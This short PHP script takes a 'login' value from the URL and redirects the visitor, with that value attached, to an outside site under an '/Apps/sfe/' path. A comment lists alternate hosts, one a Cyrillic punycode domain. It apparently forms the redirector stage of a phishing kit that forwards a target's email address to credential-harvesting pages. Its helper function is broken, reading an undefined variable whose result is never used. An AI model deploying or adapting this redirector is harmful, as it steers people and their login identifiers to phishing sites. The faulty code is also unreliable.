<?php
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($uid, $find);
$loginID = substr($uid, 0, $pos);
return $loginID;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
header("Location: http://axel-moriniere.me/Apps/sfe/?login=$login");

##http://rakom.org/Apps/SFE/http://xn--80ahheeb8au.xn--p1ai/Apps/SFE/

?>